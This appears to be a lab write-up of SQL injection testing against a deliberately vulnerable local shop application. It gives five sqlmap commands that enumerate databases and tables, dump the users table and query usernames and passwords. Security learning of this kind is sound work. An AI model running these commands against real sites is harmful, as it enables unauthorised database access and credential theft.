#  Login Authentication Bypass Testing for shopVuln website

**Target Website:** `http://172.30.176.1/shopvuln/login.php`
<img width="1342" height="610" alt="image" src="https://github.com/user-attachments/assets/d654aa2e-e706-4cb9-8d80-94a55da7d9d2" />

> This lab was performed on a deliberately vulnerable application for learning and educational security testing purposes only.

---

## Step 1 – Enumerating Databases

### Command Used
```bash
sqlmap -r vulne.txt --dbs
```

- Started database enumeration to identify all databases accessible through the SQL Injection vulnerability.
- SQLMap successfully identified multiple databases including `shopvuln`, confirming successful exploitation of the login authentication endpoint.
<img width="1245" height="536" alt="TASK2-S1" src="https://github.com/user-attachments/assets/cf11c5b2-fef3-4202-8485-2af64d4adcb1" />

---

## Step 2 – Identifying the Current Database

### Command Used
```bash
sqlmap -r vulne.txt --current-db
```

- Retrieved the currently active database used by the vulnerable web application.
- SQLMap identified `shopvuln` as the active database, which became the primary target for further enumeration.
<img width="1357" height="462" alt="TASK2-S2" src="https://github.com/user-attachments/assets/e7a510c8-0a58-482d-b36d-f8499e116b4c" />

---

## Step 3 – Enumerating Tables from the Database

### Command Used
```bash
sqlmap -r vulne.txt -D shopvuln --tables
```

- Enumerated all tables available inside the `shopvuln` database.
- SQLMap successfully discovered tables such as `users`, `orders`, `products`, and `reviews`, revealing the application's database structure.
<img width="1309" height="421" alt="TASK2-S3" src="https://github.com/user-attachments/assets/64e69e43-35b0-4ef7-9feb-3a83f62c11c7" />

---

## Step 4 – Dumping User Table Data

### Command Used
```bash
sqlmap -r vulne.txt -D shopvuln -T users --dump
```

- Extracted records from the `users` table to identify stored application credentials and user-related information.
- SQLMap successfully dumped usernames, emails, roles, and passwords from the database.
<img width="1302" height="438" alt="TASK2-S4" src="https://github.com/user-attachments/assets/c347c89f-7501-4220-b0a9-5d0c80b53692" />

---

## Step 5 – Executing Custom SQL Queries

### Command Used
```bash
sqlmap -r vulne.txt --sql-query="SELECT username, password FROM users"
```

- Executed a custom SQL query to directly retrieve usernames and passwords from the `users` table.
- SQLMap successfully returned credential pairs, demonstrating the impact of SQL Injection on authentication systems.

- <img width="1246" height="444" alt="TASK2-S5" src="https://github.com/user-attachments/assets/cf6c7f63-578a-4c51-82cc-5ba26f5edfbd" />
